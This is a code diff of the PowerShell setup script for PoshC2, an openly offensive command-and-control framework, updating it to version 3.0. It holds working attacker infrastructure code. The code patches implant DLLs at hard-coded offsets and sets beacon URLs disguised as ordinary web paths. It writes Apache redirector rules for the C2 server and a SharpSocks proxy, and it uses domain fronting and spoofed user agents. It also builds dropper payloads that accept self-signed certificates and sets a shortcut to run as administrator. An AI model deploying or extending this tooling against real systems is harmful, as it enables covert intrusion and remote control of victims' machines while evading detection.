@@ -17,7 +17,7 @@ Write-Host -Object " |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ "  -Fore
 Write-Host -Object " |    |  (  <_> )___ \|   Y  \ \     \____/       \ "  -ForegroundColor Green
 Write-Host -Object " |____|   \____/____  >___|  /  \______  /\_______ \"  -ForegroundColor Green
 Write-Host -Object "                    \/     \/          \/         \/"  -ForegroundColor Green
-Write-Host "=============== v2.15 www.PoshC2.co.uk =============" -ForegroundColor Green
+Write-Host "=============== v3.0 www.PoshC2.co.uk =============" -ForegroundColor Green
 Write-Host "" -ForegroundColor Green
 
 if (!$RestartC2Server) {
@@ -243,10 +243,10 @@ function PatchDll {
 
     if ($Arch -eq 'x86') {
         $dllOffset = 0x00012D80
-        #$dllOffset = $dllOffset +8
+        #$dllOffset = 0x00012ED0 +8
     }
     if ($Arch -eq 'x64') {
-        $dllOffset = 0x00016F00
+        $dllOffset = 0x00017100
     }
 
     # Patch DLL - replace 5000 A's
@@ -296,6 +296,8 @@ if ($RestartC2Server)
     $apikey = $c2serverresults.APIKEY
     $mobilenumber = $c2serverresults.MobileNumber
     $urlstring = $c2serverresults.URLS
+    $Socksurlstring = $c2serverresults.SocksURLS
+    $Insecure = $c2serverresults.Insecure
     $useragent = $c2serverresults.UserAgent
 
     $Host.ui.RawUI.WindowTitle = "PoshC2 Server: $ipv4address Port $serverport"
@@ -375,9 +377,10 @@ else
     #detect if powershell < v4
     $psver = $PSVersionTable.psversion.Major
     if ($psver -lt '4') {
-        $promptssl = Read-Host -Prompt "[2a] Do you want PoshC2 to use the default self-signed SSL certificate [Yes]"
+        $promptssl = Read-Host -Prompt "[2a] Do you want PoshC2 to use default and permit self-signed SSL certificates [Yes]"
         $promptssl = ($promptssldefault,$promptssl)[[bool]$promptssl]
         if ($promptssl -eq "Yes") {
+            $Insecure = "YES"
             CERTUTIL -f -p poshc2 -importpfx "$PoshPath\poshc2.pfx" 
             $thumb = "DE5ADA225693F8E0ED43453F3EB512CE96991747"
             $Deleted = netsh.exe http delete sslcert ipport=0.0.0.0:443
@@ -386,6 +389,7 @@ else
                 $cert = netsh.exe http show sslcert ipport=0.0.0.0:443
             }
         } else {
+            $Insecure = "No"
             Write-Error "Error adding the certificate" 
             Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
 https://www.microsoft.com/en-us/download/details.aspx?id=17275
@@ -405,9 +409,10 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
 "
 }
     } else {
-    $promptssl = Read-Host -Prompt "[2a] Do you want PoshC2 to create a new self-signed SSL certificate [Yes]"
+    $promptssl = Read-Host -Prompt "[2a] Do you want PoshC2 to use default and permit self-signed SSL certificates [Yes]"
     $promptssl = ($promptssldefault,$promptssl)[[bool]$promptssl]
     if ($promptssl -eq "Yes") {
+        $Insecure = "YES"
         $thumb = New-SelfSignedCertificate -certstorelocation cert:\localmachine\my -dnsname $ipv4address | select thumbprint -ExpandProperty thumbprint
         $Deleted = netsh.exe http delete sslcert ipport=0.0.0.0:443
         $Added = netsh.exe http add sslcert ipport=0.0.0.0:443 certhash=$thumb "appid={00112233-4455-6677-8899-AABBCCDDEEFF}"
@@ -433,6 +438,7 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
 "
 }
 } else {
+                $Insecure = "NO"
             Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
 https://www.microsoft.com/en-us/download/details.aspx?id=17275
 selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443
@@ -471,12 +477,13 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
     
     $apache = @"
 RewriteEngine On
-Define PoshC2 <ADD_IPADDRESS_HER>
+Define PoshC2 <ADD_IPADDRESS_HERE>
+Define SharpSocks <ADD_IPADDRESS_HERE>
 RewriteRule ^/webapp/static(.*) $uri`${PoshC2}/webapp/static`$1 [NC,P]
 RewriteRule ^/connect(.*) $uri`${PoshC2}/connect`$1 [NC,P]
 "@
     $customurldef = "No"
-    $customurl = Read-Host -Prompt "[3] Do you want to customize the beacon URLs from the default? [No]"
+    $customurl = Read-Host -Prompt "[3a] Do you want to customize the beacon URLs from the default? [No]"
     $customurl = ($customurldef,$customurl)[[bool]$customurl]
     if ($customurl -eq "Yes") {
         $urls = @()
@@ -491,7 +498,8 @@ RewriteRule ^/connect(.*) $uri`${PoshC2}/connect`$1 [NC,P]
         $urlstring = '"images/static/content/","news/id=","webapp/static/","images/prints/","wordpress/site/","steam/","true/images/77/static/","holdings/office/images/"'
             $apache = @"
 RewriteEngine On
-Define PoshC2 <ADD_IPADDRESS_HER>
+Define PoshC2 <ADD_IPADDRESS_HERE>
+Define SharpSocks <ADD_IPADDRESS_HERE>
 RewriteRule ^/connect(.*) $uri`${PoshC2}/connect`$1 [NC,P]
 RewriteRule ^/images/static/content/(.*) $uri`${PoshC2}/images/static/content/`$1 [NC,P]
 RewriteRule ^/news/(.*) $uri`${PoshC2}/news/`$1 [NC,P]
@@ -504,6 +512,30 @@ RewriteRule ^/steam(.*) $uri`${PoshC2}/steam`$1 [NC,P]
 "@
     }
 
+    $customurldef = "No"
+    $customurl = Read-Host -Prompt "[3b] Do you want to customize the beacon URLs from the Socks Proxy (SharpSocks)? [No]"
+    $customurl = ($customurldef,$customurl)[[bool]$customurl]
+    if ($customurl -eq "Yes") {
+        $urls = @()
+        do {
+            $input = (Read-Host "Please enter the URLs you want to use, enter blank entry to finish: images/site/content")
+            if ($input -ne '') {$urls += "`"$input`""; $apache += "`nRewriteRule ^/$input(.*) $uri`${SharpSocks}/$input`$1 [NC,P]"}
+        }
+        until ($input -eq '')
+        [string]$socksurlstring = $null
+        $socksurlstring = $urls -join ","
+    } else {
+        $socksurlstring = '"sitemap/api/push","visitors/upload/map","printing/images/bin/logo","update/latest/traffic","saml/stats/update/push"'
+        $apache += @"
+
+RewriteRule ^/sitemap/api/push(.*) $uri`${SharpSocks}/sitemap/api/push`$1 [NC,P]
+RewriteRule ^/visitors/upload/map(.*) $uri`${SharpSocks}/visitors/upload/map`$1 [NC,P]
+RewriteRule ^/printing/images/bin/logo(.*) $uri`${SharpSocks}/printing/images/bin/logo`$1 [NC,P]
+RewriteRule ^/update/latest/traffic(.*) $uri`${SharpSocks}/update/latest/traffic`$1 [NC,P]
+RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/push`$1 [NC,P]
+"@
+    }
+
     $customuseragentdef = "No"
     $customuseragent = Read-Host -Prompt "[4] Do you want to customize the default UserAgent? [No]"
     $customuseragent = ($customuseragentdef,$customuseragent)[[bool]$customuseragent]
@@ -513,7 +545,6 @@ RewriteRule ^/steam(.*) $uri`${PoshC2}/steam`$1 [NC,P]
     } else {
         $useragent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)"
     }
-
 
     $global:newdir = 'PoshC2-'+(get-date -Format yyy-dd-MM-HHmm)
     $prompt = Read-Host -Prompt "[5] Enter a new folder name for this project [$($global:newdir)]"
@@ -660,6 +691,8 @@ RewriteRule ^/steam(.*) $uri`${PoshC2}/steam`$1 [NC,P]
         APIKEY TEXT,
         MobileNumber TEXT,
         URLS TEXT,
+        SocksURLS TEXT,
+        Insecure TEXT,
         UserAgent TEXT)'
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
@@ -670,8 +703,8 @@ RewriteRule ^/steam(.*) $uri`${PoshC2}/steam`$1 [NC,P]
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
 
-    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds, APIKEY, MobileNumber, URLS, UserAgent)
-            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds, @APIKEY, @MobileNumber, @URLS, @UserAgent)'
+    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds, APIKEY, MobileNumber, URLS, SocksURLS, Insecure, UserAgent)
+            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds, @APIKEY, @MobileNumber, @URLS, @SocksURLS, @Insecure, @UserAgent)'
 
     Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
         DefaultSleep = $defaultbeacon
@@ -687,6 +720,8 @@ RewriteRule ^/steam(.*) $uri`${PoshC2}/steam`$1 [NC,P]
         APIKEY = $apikey
         MobileNumber = $MobileNumber
         URLS = $urlstring
+        SocksURLS = $socksurlstring
+        Insecure = $Insecure
         UserAgent = $useragent
     } | Out-Null
 
@@ -727,7 +762,11 @@ RewriteRule ^/steam(.*) $uri`${PoshC2}/steam`$1 [NC,P]
     Write-Host -Object "activities, use the following payloads:"
     
     Import-Module $PoshPath\C2-Payloads.ps1 
-    $command = createdropper -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent
+    if ($Insecure -eq "YES") {
+        $command = createdropper -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent -Insecure
+    } else {
+        $command = createdropper -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent
+    }
     $payload = createrawpayload -command $command
 
     if ($enablepayloads -eq "Yes") {
@@ -781,6 +820,10 @@ RewriteRule ^/steam(.*) $uri`${PoshC2}/steam`$1 [NC,P]
     $Shortcut.TargetPath = $SourceExe
     $Shortcut.Arguments = $ArgumentsToSourceExe
     $Shortcut.Save()
+    # add run as administrator 
+    $bytes = [System.IO.File]::ReadAllBytes("$global:newdir\Restart-Implant-Handler.lnk")
+    $bytes[0x15] = $bytes[0x15] -bor 0x20
+    [System.IO.File]::WriteAllBytes("$global:newdir\Restart-Implant-Handler.lnk", $bytes)
 }
 
 # add as many images to the images directory as long as the images are less than 1500 bytes in size
